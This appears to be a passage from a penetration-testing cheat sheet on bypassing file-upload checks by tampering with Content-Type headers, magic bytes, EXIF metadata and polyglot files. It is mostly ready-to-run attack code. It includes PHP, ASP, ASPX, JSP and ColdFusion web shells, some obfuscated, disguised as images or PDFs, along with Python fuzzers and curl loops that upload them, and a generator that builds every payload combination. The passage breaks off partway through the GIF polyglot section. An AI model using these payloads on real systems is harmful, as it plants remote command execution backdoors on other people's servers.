  # Standard
  Content-Type: image/jpeg
  
  # Full uppercase
  CONTENT-TYPE: image/jpeg
  
  # Mixed case
  Content-type: image/jpeg
  content-Type: image/jpeg
  content-type: image/jpeg
  CONTENT-type: image/jpeg
  Content-TYPE: image/jpeg
  
  # ═══════════════════════════════════════════
  #  MIME Value Casing
  # ═══════════════════════════════════════════
  # MIME types should be case-insensitive but may not be
  
  image/jpeg            # Standard lowercase
  IMAGE/JPEG            # Full uppercase
  Image/Jpeg            # Title case
  IMAGE/jpeg            # Mixed
  image/JPEG            # Mixed
  Image/JPEG            # Mixed
  iMaGe/JpEg           # Random case
  
  # ═══════════════════════════════════════════
  #  Whitespace Injection
  # ═══════════════════════════════════════════
  
  Content-Type: image/jpeg              # Standard
  Content-Type:image/jpeg               # No space after colon
  Content-Type:  image/jpeg             # Double space
  Content-Type:   image/jpeg            # Triple space
  Content-Type:\timage/jpeg             # Tab character
  Content-Type: image/jpeg              # Trailing space
  Content-Type: image/jpeg\t            # Trailing tab
  Content-Type:  image/jpeg  \r\n       # Trailing CRLF
   Content-Type: image/jpeg             # Leading space in header name
  
  # ═══════════════════════════════════════════
  #  Python test for MIME value casing
  # ═══════════════════════════════════════════
  python3 << 'PYEOF'
  import requests, io, urllib3
  urllib3.disable_warnings()
  
  url = "https://target.com/upload"
  cookies = {"session": "YOUR_COOKIE"}
  shell = b'<?php echo md5("case_test"); ?>'
  
  case_values = [
      "image/jpeg", "IMAGE/JPEG", "Image/Jpeg", "IMAGE/jpeg",
      "image/JPEG", "Image/JPEG", "iMaGe/JpEg",
      "image/png", "IMAGE/PNG", "Image/Png",
      "image/gif", "IMAGE/GIF", "Image/Gif",
  ]
  
  for ct in case_values:
      files = {"file": ("test.php", io.BytesIO(shell), ct)}
      r = requests.post(url, files=files, cookies=cookies, verify=False, timeout=5)
      status = "✓" if r.status_code in [200,201] else "✗"
      print(f"  [{status}] {ct:25s} → HTTP {r.status_code}")
  PYEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-settings" label="Parameter Injection & Malformed Headers"}
  Adding parameters, semicolons, quotes, or extra attributes to the Content-Type value may confuse parsers that use regex or string splitting to extract the MIME type.

  ```bash
  # ═══════════════════════════════════════════
  #  Content-Type with Parameters
  # ═══════════════════════════════════════════
  
  # Standard
  Content-Type: image/jpeg
  
  # With charset
  Content-Type: image/jpeg; charset=utf-8
  Content-Type: image/jpeg; charset=binary
  Content-Type: image/jpeg;charset=utf-8
  Content-Type: image/jpeg ; charset=utf-8
  
  # With boundary (unusual for non-multipart but may be accepted)
  Content-Type: image/jpeg; boundary=something
  
  # With name parameter (echoes filename)
  Content-Type: image/jpeg; name="shell.php"
  Content-Type: image/jpeg; name=shell.php
  
  # Extra semicolons
  Content-Type: image/jpeg;
  Content-Type: image/jpeg;;
  Content-Type: ;image/jpeg
  Content-Type: ;;image/jpeg
  
  # Quotes around value
  Content-Type: "image/jpeg"
  Content-Type: 'image/jpeg'
  
  # ═══════════════════════════════════════════
  #  Malformed MIME Values
  # ═══════════════════════════════════════════
  
  # Empty
  Content-Type:
  Content-Type: 
  
  # Null byte
  Content-Type: image/jpeg\x00
  Content-Type: image/jpeg\x00application/x-php
  
  # Very long value (buffer overflow / WAF bypass)
  Content-Type: image/jpeg; x=AAAA...(2000 A's)...AAAA
  
  # No subtype
  Content-Type: image
  
  # Multiple slashes
  Content-Type: image/jpeg/extra
  Content-Type: image/jpeg/png
  
  # Wildcard
  Content-Type: */*
  Content-Type: image/*
  
  # ═══════════════════════════════════════════
  #  Python Parameter Injection Fuzzer
  # ═══════════════════════════════════════════
  python3 << 'PARAMEOF'
  import socket, ssl
  
  host = "target.com"
  cookie = "session=YOUR_COOKIE"
  boundary = "----TestBnd1234"
  shell = '<?php echo md5("param_bypass"); ?>'
  
  ct_payloads = [
      "image/jpeg",
      "image/jpeg; charset=utf-8",
      "image/jpeg; charset=binary",
      "image/jpeg; boundary=test",
      'image/jpeg; name="shell.php"',
      "image/jpeg;",
      "image/jpeg;;",
      ";image/jpeg",
      '"image/jpeg"',
      " image/jpeg",
      "image/jpeg ",
      "",
      " ",
      "image",
      "*/*",
      "image/*",
      "image/jpeg" + "\x00",
      "image/jpeg; x=" + "A" * 500,
      "image/jpeg/extra",
      "IMAGE/JPEG",
      "Image/Jpeg",
  ]
  
  for ct in ct_payloads:
      body = f"--{boundary}\r\n"
      body += f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
      body += f"Content-Type: {ct}\r\n\r\n"
      body += f"{shell}\r\n"
      body += f"--{boundary}--\r\n"
  
      req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nCookie: {cookie}\r\n"
      req += f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
      req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
  
      try:
          ctx = ssl.create_default_context()
          ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
          s = ctx.wrap_socket(socket.socket(), server_hostname=host)
          s.connect((host, 443))
          s.send(req.encode('latin-1', errors='replace'))
          resp = b""
          while True:
              d = s.recv(4096)
              if not d: break
              resp += d
          s.close()
          status = resp.split(b'\r\n')[0].decode() if resp else "NO RESPONSE"
          safe_ct = repr(ct)[:50]
          print(f"  {safe_ct:52s} → {status}")
      except Exception as e:
          print(f"  {repr(ct)[:52]:52s} → ERROR: {e}")
  PARAMEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-copy" label="Duplicate Content-Type Headers"}
  When a multipart body part contains two `Content-Type` headers, different components may read different values. The WAF may check the first while the application uses the last — or vice versa.

  ```bash
  # ═══════════════════════════════════════════
  #  Duplicate Content-Type Headers
  #  Must be done via Burp Suite or raw sockets
  # ═══════════════════════════════════════════
  
  # Pattern 1: Image first, PHP second
  # WAF reads first (image/jpeg → safe), app reads last (x-php → processes)
  ------Boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg
  Content-Type: application/x-httpd-php
  
  <?php system($_GET['cmd']); ?>
  ------Boundary--
  
  # Pattern 2: PHP first, Image second
  # WAF reads last (image/jpeg → safe), app reads first (x-php → processes)
  ------Boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: application/x-httpd-php
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  ------Boundary--
  
  # Pattern 3: Same value duplicated (tests parser behavior)
  ------Boundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg
  Content-Type: image/jpeg
  
  <?php system($_GET['cmd']); ?>
  ------Boundary--
  
  # === Python script for duplicate header testing ===
  python3 << 'DUPEOF'
  import socket, ssl
  
  host = "target.com"
  cookie = "session=YOUR_COOKIE"
  bnd = "----DupTest"
  shell = '<?php echo md5("dup_header"); ?>'
  
  patterns = [
      ("img_first_php_second", "Content-Type: image/jpeg\r\nContent-Type: application/x-httpd-php"),
      ("php_first_img_second", "Content-Type: application/x-httpd-php\r\nContent-Type: image/jpeg"),
      ("img_img_duplicate",    "Content-Type: image/jpeg\r\nContent-Type: image/jpeg"),
      ("img_octet",            "Content-Type: image/jpeg\r\nContent-Type: application/octet-stream"),
      ("octet_img",            "Content-Type: application/octet-stream\r\nContent-Type: image/jpeg"),
      ("three_ct",             "Content-Type: image/jpeg\r\nContent-Type: text/plain\r\nContent-Type: image/png"),
  ]
  
  for name, ct_block in patterns:
      body = f"--{bnd}\r\n"
      body += f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
      body += f"{ct_block}\r\n\r\n"
      body += f"{shell}\r\n"
      body += f"--{bnd}--\r\n"
  
      req = f"POST /upload HTTP/1.1\r\nHost: {host}\r\nCookie: {cookie}\r\n"
      req += f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
      req += f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
  
      try:
          ctx = ssl.create_default_context()
          ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
          s = ctx.wrap_socket(socket.socket(), server_hostname=host)
          s.connect((host, 443))
          s.send(req.encode('latin-1'))
          resp = b""
          while True:
              d = s.recv(4096)
              if not d: break
              resp += d
          s.close()
          status = resp.split(b'\r\n')[0].decode()
          print(f"  [{name:25s}] → {status}")
      except Exception as e:
          print(f"  [{name:25s}] → ERROR: {e}")
  DUPEOF
  ```
  :::
::

---

## Magic Byte Injection

### File Signature Reference

::collapsible
**Complete Magic Byte / File Signature Table**

| Format | Hex Bytes | ASCII | Notes |
| --- | --- | --- | --- |
| **JPEG (JFIF)** | `FF D8 FF E0` | `ÿØÿà` | Most common JPEG variant |
| **JPEG (EXIF)** | `FF D8 FF E1` | `ÿØÿá` | Camera photos |
| **JPEG (minimal)** | `FF D8 FF DB` | `ÿØÿÛ` | Starts with DQT marker |
| **PNG** | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG\r\n\x1a\n` | 8-byte signature |
| **GIF89a** | `47 49 46 38 39 61` | `GIF89a` | Animated GIF support |
| **GIF87a** | `47 49 46 38 37 61` | `GIF87a` | Original GIF spec |
| **BMP** | `42 4D` | `BM` | Windows bitmap |
| **WEBP** | `52 49 46 46 xx xx xx xx 57 45 42 50` | `RIFF....WEBP` | 12 bytes with size field |
| **TIFF (LE)** | `49 49 2A 00` | `II*\x00` | Little-endian |
| **TIFF (BE)** | `4D 4D 00 2A` | `MM\x00*` | Big-endian |
| **ICO** | `00 00 01 00` | `\x00\x00\x01\x00` | Windows icon |
| **PDF** | `25 50 44 46 2D` | `%PDF-` | PDF document |
| **ZIP/DOCX/XLSX** | `50 4B 03 04` | `PK\x03\x04` | ZIP archive (Office docs) |
| **RAR** | `52 61 72 21 1A 07` | `Rar!\x1a\x07` | RAR archive |
| **GZIP** | `1F 8B` | `\x1f\x8b` | Gzip compressed |
| **7Z** | `37 7A BC AF 27 1C` | `7z¼¯'\x1c` | 7-Zip archive |
| **ELF** | `7F 45 4C 46` | `\x7fELF` | Linux executable |
| **WASM** | `00 61 73 6D` | `\x00asm` | WebAssembly |
| **MP4** | `00 00 00 xx 66 74 79 70` | `\x00\x00\x00.ftyp` | MPEG-4 video |
| **MP3 (ID3)** | `49 44 33` | `ID3` | MP3 with ID3 tag |
| **FLAC** | `66 4C 61 43` | `fLaC` | FLAC audio |
| **OGG** | `4F 67 67 53` | `OggS` | Ogg container |
::

### Shell Payload Generation with Magic Bytes

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Image Magic + PHP Shells"}
  ```bash
  # ═══════════════════════════════════════════
  #  GIF89a + PHP Shell (EASIEST — plain ASCII header)
  # ═══════════════════════════════════════════
  # GIF89a is 6 ASCII characters that PHP ignores as text output
  # This is the simplest magic byte bypass
  
  printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell_gif.php
  file shell_gif.php
  # → GIF image data, version 89a
  xxd shell_gif.php | head -3
  
  # Upload with matching MIME
  curl -X POST https://target.com/upload \
    -F "file=@shell_gif.php;type=image/gif" -b "session=COOKIE"
  
  # Variants with different PHP payloads
  printf 'GIF89a\n<?php echo shell_exec($_GET["cmd"]); ?>' > gif_shellexec.php
  printf 'GIF89a\n<?php passthru($_GET["cmd"]); ?>' > gif_passthru.php
  printf 'GIF89a\n<?=`$_GET[c]`?>' > gif_short.php
  printf 'GIF89a\n<?php eval(base64_decode($_GET["e"])); ?>' > gif_eval.php
  printf 'GIF89a\n<?php $x="sys"."tem";$x($_GET["cmd"]); ?>' > gif_obf.php
  
  # GIF87a variant
  printf 'GIF87a\n<?php system($_GET["cmd"]); ?>' > shell_gif87.php
  file shell_gif87.php
  # → GIF image data, version 87a
  
  
  # ═══════════════════════════════════════════
  #  JPEG + PHP Shell (most trusted by validators)
  # ═══════════════════════════════════════════
  # JFIF header: FF D8 FF E0 00 10 JFIF 00 01 01 00 00 01 00 01 00 00
  
  printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell_jpg.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_jpg.php
  file shell_jpg.php
  # → JPEG image data, JFIF standard 1.01
  
  curl -X POST https://target.com/upload \
    -F "file=@shell_jpg.php;type=image/jpeg" -b "session=COOKIE"
  
  # EXIF variant (alternative JPEG signature)
  printf '\xff\xd8\xff\xe1' > shell_jpg_exif.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_jpg_exif.php
  file shell_jpg_exif.php
  # → JPEG image data, Exif standard
  
  # Minimal JPEG (just start-of-image + DQT marker)
  printf '\xff\xd8\xff\xdb' > shell_jpg_min.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_jpg_min.php
  
  
  # ═══════════════════════════════════════════
  #  PNG + PHP Shell
  # ═══════════════════════════════════════════
  printf '\x89PNG\r\n\x1a\n' > shell_png.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_png.php
  file shell_png.php
  # → PNG image data
  
  curl -X POST https://target.com/upload \
    -F "file=@shell_png.php;type=image/png" -b "session=COOKIE"
  
  
  # ═══════════════════════════════════════════
  #  BMP + PHP Shell
  # ═══════════════════════════════════════════
  printf 'BM' > shell_bmp.php
  printf '\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00' >> shell_bmp.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_bmp.php
  file shell_bmp.php
  # → PC bitmap
  
  
  # ═══════════════════════════════════════════
  #  PDF + PHP Shell
  # ═══════════════════════════════════════════
  printf '%%PDF-1.4\n' > shell_pdf.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_pdf.php
  printf '\n%%%%EOF' >> shell_pdf.php
  file shell_pdf.php
  # → PDF document, version 1.4
  
  
  # ═══════════════════════════════════════════
  #  WEBP + PHP Shell
  # ═══════════════════════════════════════════
  printf 'RIFF\x00\x00\x00\x00WEBP' > shell_webp.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_webp.php
  file shell_webp.php
  
  
  # ═══════════════════════════════════════════
  #  TIFF + PHP Shell
  # ═══════════════════════════════════════════
  # Little-endian TIFF
  printf '\x49\x49\x2a\x00' > shell_tiff_le.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_tiff_le.php
  
  # Big-endian TIFF
  printf '\x4d\x4d\x00\x2a' > shell_tiff_be.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_tiff_be.php
  
  
  # ═══════════════════════════════════════════
  #  ICO + PHP Shell
  # ═══════════════════════════════════════════
  printf '\x00\x00\x01\x00' > shell_ico.php
  printf '<?php system($_GET["cmd"]); ?>' >> shell_ico.php
  
  
  # ═══════════════════════════════════════════
  #  Verify all generated files
  # ═══════════════════════════════════════════
  echo ""
  echo "=== Generated Magic Byte Shells ==="
  for f in shell_gif.php shell_gif87.php shell_jpg.php shell_jpg_exif.php shell_png.php shell_bmp.php shell_pdf.php shell_webp.php shell_tiff_le.php shell_ico.php; do
    if [ -f "$f" ]; then
      FTYPE=$(file -b "$f" | cut -c1-50)
      SIZE=$(wc -c < "$f")
      echo "  $f (${SIZE}B) → $FTYPE"
    fi
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Magic Bytes + Other Language Shells"}
  ```bash
  # ═══════════════════════════════════════════
  #  GIF89a + ASP/ASPX/JSP/Python/Perl Shells
  # ═══════════════════════════════════════════
  
  # --- ASP Classic ---
  printf 'GIF89a\n<%%eval request("cmd")%%>' > shell.asp
  file shell.asp
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp;type=image/gif" -b "session=COOKIE"
  
  # --- ASPX ---
  printf 'GIF89a\n' > shell.aspx
  cat >> shell.aspx << 'EOF'
  <%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
  <%string c=Request["cmd"];if(c!=null){Process p=new Process();
  p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;
  p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;
  p.Start();Response.Write(p.StandardOutput.ReadToEnd());}%>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.aspx;type=image/gif" -b "session=COOKIE"
  
  # --- JSP ---
  printf 'GIF89a\n' > shell.jsp
  cat >> shell.jsp << 'EOF'
  <%@ page import="java.util.*,java.io.*" %>
  <%String cmd=request.getParameter("cmd");if(cmd!=null){
  Process p=Runtime.getRuntime().exec(cmd);
  BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l;while((l=br.readLine())!=null)out.println(l);}%>
  EOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp;type=image/gif" -b "session=COOKIE"
  
  # --- SSI (Server Side Includes) ---
  printf 'GIF89a\n<!--#exec cmd="id" -->' > shell.shtml
  curl -X POST https://target.com/upload \
    -F "file=@shell.shtml;type=image/gif" -b "session=COOKIE"
  
  # --- ColdFusion ---
  printf 'GIF89a\n<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="output" timeout="10"/><cfoutput>#output#</cfoutput>' > shell.cfm
  curl -X POST https://target.com/upload \
    -F "file=@shell.cfm;type=image/gif" -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Batch Generator — All Combinations"}
  ```python
  #!/usr/bin/env python3
  """Generate all magic byte + shell payload combinations"""
  import os, subprocess
  
  magic_bytes = {
      'gif89a':    b'GIF89a\n',
      'gif87a':    b'GIF87a\n',
      'jpeg_jfif': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
      'jpeg_exif': b'\xff\xd8\xff\xe1\x00\x00',
      'jpeg_min':  b'\xff\xd8\xff\xdb',
      'png':       b'\x89PNG\r\n\x1a\n',
      'bmp':       b'BM\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00',
      'pdf':       b'%PDF-1.4\n',
      'webp':      b'RIFF\x00\x00\x00\x00WEBP',
      'tiff_le':   b'\x49\x49\x2a\x00',
      'tiff_be':   b'\x4d\x4d\x00\x2a',
      'ico':       b'\x00\x00\x01\x00',
      'zip':       b'PK\x03\x04',
  }
  
  shells = {
      'system':     b'<?php system($_GET["cmd"]); ?>',
      'shell_exec': b'<?php echo shell_exec($_GET["cmd"]); ?>',
      'passthru':   b'<?php passthru($_GET["cmd"]); ?>',
      'short':      b'<?=`$_GET[c]`?>',
      'eval_b64':   b'<?php eval(base64_decode($_GET["e"])); ?>',
      'obfuscated': b'<?php $a="sys"."tem";$a($_GET["cmd"]); ?>',
      'chr_obf':    b'<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET["cmd"]); ?>',
      'rot13':      b'<?php $a=str_rot13("flfgrz");$a($_GET["cmd"]); ?>',
      'var_func':   b'<?php $_GET["f"]($_GET["c"]); ?>',
  }
  
  mime_map = {
      'gif89a': 'image/gif', 'gif87a': 'image/gif',
      'jpeg_jfif': 'image/jpeg', 'jpeg_exif': 'image/jpeg', 'jpeg_min': 'image/jpeg',
      'png': 'image/png', 'bmp': 'image/bmp', 'pdf': 'application/pdf',
      'webp': 'image/webp', 'tiff_le': 'image/tiff', 'tiff_be': 'image/tiff',
      'ico': 'image/x-icon', 'zip': 'application/zip',
  }
  
  os.makedirs('magic_payloads', exist_ok=True)
  
  count = 0
  for mname, mbytes in magic_bytes.items():
      for sname, sbytes in shells.items():
          fname = f"magic_payloads/{mname}_{sname}.php"
          with open(fname, 'wb') as f:
              f.write(mbytes + sbytes)
          count += 1
  
  print(f"Generated {count} payloads in magic_payloads/")
  print(f"\nSample file types:")
  for f in sorted(os.listdir('magic_payloads'))[:10]:
      path = f"magic_payloads/{f}"
      ftype = subprocess.run(['file', '-b', path], capture_output=True, text=True).stdout.strip()[:60]
      print(f"  {f:45s} → {ftype}")
  
  # Generate upload script
  with open('magic_payloads/upload_all.sh', 'w') as f:
      f.write('#!/bin/bash\nTARGET="$1"; COOKIE="$2"; FIELD="${3:-file}"\n')
      f.write('[ -z "$TARGET" ] && echo "Usage: $0 <url> <cookie> [field]" && exit 1\n\n')
      for mname in magic_bytes:
          for sname in shells:
              fname = f"{mname}_{sname}.php"
              mime = mime_map.get(mname, 'application/octet-stream')
              f.write(f'S=$(curl -so /dev/null -w "%{{http_code}}" -X POST "$TARGET" ')
              f.write(f'-F "$FIELD=@magic_payloads/{fname};type={mime}" -b "$COOKIE" 2>/dev/null)\n')
              f.write(f'[ "$S" = "200" ] || [ "$S" = "201" ] && echo "[+] {fname} ({mime}) → HTTP $S"\n')
  
  os.chmod('magic_payloads/upload_all.sh', 0o755)
  print(f"\nUpload script: magic_payloads/upload_all.sh <url> <cookie>")
  ```
  :::
::

### EXIF Metadata Injection

::tip
Injecting PHP code into EXIF metadata of a **real, valid, renderable image** is the most reliable bypass against magic byte checks and even partial content validation. The image opens correctly in any viewer while containing executable PHP code in its metadata fields.
::

::code-group
```bash [ExifTool Injection]
# ═══════════════════════════════════════════
#  Create a clean base image
# ═══════════════════════════════════════════
python3 -c "
from PIL import Image
img = Image.new('RGB', (200, 200), color='red')
img.save('base.jpg', 'JPEG')
print('Created base.jpg')
"

# ═══════════════════════════════════════════
#  Inject PHP into single EXIF field
# ═══════════════════════════════════════════
exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.jpg
file base.jpg          # Still: JPEG image data
strings base.jpg | grep "php"  # Shows PHP code

# ═══════════════════════════════════════════
#  Inject into MULTIPLE fields (redundancy)
#  Some apps strip specific fields but miss others
# ═══════════════════════════════════════════
exiftool \
  -Comment='<?php system($_GET["cmd"]); ?>' \
  -Artist='<?php system($_GET["cmd"]); ?>' \
  -ImageDescription='<?php system($_GET["cmd"]); ?>' \
  -UserComment='<?php system($_GET["cmd"]); ?>' \
  -DocumentName='<?php echo shell_exec($_GET["cmd"]); ?>' \
  -Copyright='<?php passthru($_GET["cmd"]); ?>' \
  -Software='<?php exec($_GET["cmd"],$o);echo implode("\n",$o); ?>' \
  -Make='<?=`$_GET[c]`?>' \
  -Model='<?php eval(base64_decode($_GET["e"])); ?>' \
  -XPComment='<?php system($_GET["cmd"]); ?>' \
  -XPAuthor='<?php system($_GET["cmd"]); ?>' \
  base.jpg

# Verify all fields
exiftool base.jpg | grep -i "php" | head -15
echo ""
echo "PHP occurrences: $(strings base.jpg | grep -c 'php')"

# ═══════════════════════════════════════════
#  Copy for different upload strategies
# ═══════════════════════════════════════════
cp base.jpg shell_exif.php          # Direct PHP extension
cp base.jpg shell_exif.php.jpg      # Double extension
cp base.jpg shell_exif.phtml        # Alt PHP extension
cp base.jpg shell_exif.phar         # PHAR extension
cp base.jpg shell_exif.jpg          # Safe extension (chain with LFI/.htaccess)
cp base.jpg shell_exif.php5         # PHP5 extension
cp base.jpg shell_exif.php.xyz      # Unknown ext fallback

# Upload each with appropriate MIME
for f in shell_exif.php shell_exif.php.jpg shell_exif.phtml shell_exif.jpg; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
    -F "file=@$f;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)
  echo "$f → HTTP $STATUS"
done
```

```bash [Test EXIF Survival After Processing]
# ═══════════════════════════════════════════
#  Check if PHP code survives server-side image processing
# ═══════════════════════════════════════════

# Simulate resize
python3 << 'PYEOF'
from PIL import Image
import subprocess

# Load injected image
img = Image.open('base.jpg')

# Test 1: Resize (preserves EXIF in most cases)
resized = img.resize((100, 100))
resized.save('test_resize.jpg', 'JPEG')
result = subprocess.getoutput("strings test_resize.jpg | grep -c 'system'")
print(f"After resize:        PHP survives = {int(result) > 0}")

# Test 2: Convert format (usually strips EXIF)
img.save('test_convert.png', 'PNG')
result = subprocess.getoutput("strings test_convert.png | grep -c 'system'")
print(f"After PNG convert:   PHP survives = {int(result) > 0}")

# Test 3: Re-save as JPEG (may preserve or strip)
img_reopen = Image.open('base.jpg')
img_reopen.save('test_resave.jpg', 'JPEG', quality=85)
result = subprocess.getoutput("strings test_resave.jpg | grep -c 'system'")
print(f"After JPEG resave:   PHP survives = {int(result) > 0}")

# Test 4: Save with exif= parameter (explicitly copies EXIF)
exif_data = img.info.get('exif', b'')
if exif_data:
    img.save('test_exif_copy.jpg', 'JPEG', exif=exif_data)
    result = subprocess.getoutput("strings test_exif_copy.jpg | grep -c 'system'")
    print(f"After exif copy:     PHP survives = {int(result) > 0}")

# Test 5: Strip EXIF completely
img_stripped = Image.open('base.jpg')
img_stripped.save('test_stripped.jpg', 'JPEG', quality=85)
# This typically strips EXIF
result = subprocess.getoutput("strings test_stripped.jpg | grep -c 'system'")
print(f"After strip:         PHP survives = {int(result) > 0}")

# Test 6: Thumbnail generation
img.thumbnail((50, 50))
img.save('test_thumb.jpg', 'JPEG')
result = subprocess.getoutput("strings test_thumb.jpg | grep -c 'system'")
print(f"After thumbnail:     PHP survives = {int(result) > 0}")
PYEOF
```

```bash [Advanced: EXIF in PNG and GIF]
# ═══════════════════════════════════════════
#  EXIF injection into PNG
# ═══════════════════════════════════════════
python3 -c "from PIL import Image; Image.new('RGB',(100,100),'blue').save('base.png','PNG')"
exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.png
file base.png     # → PNG image data
strings base.png | grep "php"
cp base.png shell_exif_png.php
curl -X POST https://target.com/upload \
  -F "file=@shell_exif_png.php;type=image/png" -b "session=COOKIE"

# ═══════════════════════════════════════════
#  EXIF injection into GIF
# ═══════════════════════════════════════════
python3 -c "from PIL import Image; Image.new('RGB',(100,100),'green').save('base.gif','GIF')"
exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.gif
file base.gif     # → GIF image data
strings base.gif | grep "php"
cp base.gif shell_exif_gif.php
curl -X POST https://target.com/upload \
  -F "file=@shell_exif_gif.php;type=image/gif" -b "session=COOKIE"

# ═══════════════════════════════════════════
#  EXIF injection into WEBP
# ═══════════════════════════════════════════
python3 -c "from PIL import Image; Image.new('RGB',(100,100),'yellow').save('base.webp','WEBP')"
exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.webp
cp base.webp shell_exif_webp.php
curl -X POST https://target.com/upload \
  -F "file=@shell_exif_webp.php;type=image/webp" -b "session=COOKIE"

# ═══════════════════════════════════════════
#  EXIF injection into TIFF
# ═══════════════════════════════════════════
python3 -c "from PIL import Image; Image.new('RGB',(100,100),'purple').save('base.tiff','TIFF')"
exiftool -Comment='<?php system($_GET["cmd"]); ?>' base.tiff
cp base.tiff shell_exif_tiff.php
curl -X POST https://target.com/upload \
  -F "file=@shell_exif_tiff.php;type=image/tiff" -b "session=COOKIE"
```
::

---

## Polyglot Files

::warning
A polyglot file is simultaneously valid in multiple formats. A JPEG/PHP polyglot passes `getimagesize()`, `finfo_file()`, image rendering libraries, AND executes as PHP code. This is the most powerful MIME bypass technique for defeating multi-layer validation.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JPEG/PHP Polyglot"}
  ```bash
  # ═══════════════════════════════════════════
  #  JPEG/PHP Polyglot via COM marker
  # ═══════════════════════════════════════════
  # PHP code is placed inside a JPEG COM (comment) marker
  # The file is a valid, renderable JPEG AND valid PHP
  
  python3 << 'POLYEOF'
  import struct
  
  jpeg = bytearray()
  
  # SOI (Start of Image)
  jpeg += b'\xff\xd8'
  
  # APP0 (JFIF header — makes it a valid JFIF JPEG)
  jpeg += b'\xff\xe0'
  jpeg += struct.pack('>H', 16)  # Length
  jpeg += b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
  
  # COM marker with PHP payload
  php_payload = b'<?php system($_GET["cmd"]); ?>'
  jpeg += b'\xff\xfe'  # COM marker
  jpeg += struct.pack('>H', len(php_payload) + 2)  # Length including 2 bytes for length field
  jpeg += php_payload
  
  # SOF0 (Start of Frame — defines 1x1 pixel image)
  jpeg += b'\xff\xc0'
  jpeg += b'\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
  
  # DHT (Huffman Table — minimal)
  jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01'
  jpeg += b'\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
  
  # SOS (Start of Scan)
  jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40'
  
  # EOI (End of Image)
  jpeg += b'\xff\xd9'
  
  with open('polyglot_jpg.php', 'wb') as f:
      f.write(jpeg)
  
  # Verify
  import subprocess, os
  print(f"File size: {os.path.getsize('polyglot_jpg.php')} bytes")
  print(f"File type: {subprocess.getoutput('file -b polyglot_jpg.php')}")
  print(f"Has PHP:   {'system' in open('polyglot_jpg.php','rb').read().decode('latin-1')}")
  
  # Test with Pillow
  try:
      from PIL import Image
      img = Image.open('polyglot_jpg.php')
      print(f"Pillow:    {img.format} {img.size}")
  except Exception as e:
      print(f"Pillow:    {e}")
  
  # Create copies with different extensions
  import shutil
  for ext in ['php', 'php.jpg', 'phtml', 'jpg', 'php5', 'phar', 'php.xyz']:
      shutil.copy('polyglot_jpg.php', f'polyglot.{ext}')
  POLYEOF
  
  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@polyglot_jpg.php;type=image/jpeg" -b "session=COOKIE"
  
  # Try with double extension
  curl -X POST https://target.com/upload \
    -F "file=@polyglot.php.jpg;type=image/jpeg" -b "session=COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="GIF/PHP Polyglot"}
  ```bash
  # ═══════════════════════════════════════════
  #  GIF/PHP Polyglot (simplest polyglot)
  # ═══════════════════════════════════════════
  # GIF89a is ASCII text — PHP treats it as output, not code
  # Simplest one-liner polyglot
  
  echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot_simple.gif
  file polyglot_simple.gif
  # → GIF image data, version 89a
  
  # ═══════════════════════════════════════════
  #  Valid GIF structure + PHP after trailer
